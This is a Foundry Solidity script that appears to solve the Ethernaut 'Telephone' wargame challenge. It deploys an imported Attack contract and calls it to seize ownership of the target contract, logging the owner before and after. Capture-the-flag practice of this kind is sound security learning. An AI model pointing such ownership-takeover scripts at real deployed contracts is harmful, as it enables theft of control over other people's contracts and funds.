// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Telephone} from "../src/Telephone.sol";
import {Attack} from "../src/Attack.sol";

contract TelephoneSolution is Script {
    Telephone public telephoneInstance = Telephone(<Contract_Address>);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Before attack, Owner:", telephoneInstance.owner());

        // Attack contract deploy
        Attack attacker = new Attack(telephoneInstance);

        // Attack 
        attacker.attack(vm.envAddress("MY_ADDRESS"));

        console.log("After attack, Owner:", telephoneInstance.owner());

        vm.stopBroadcast();
    }
}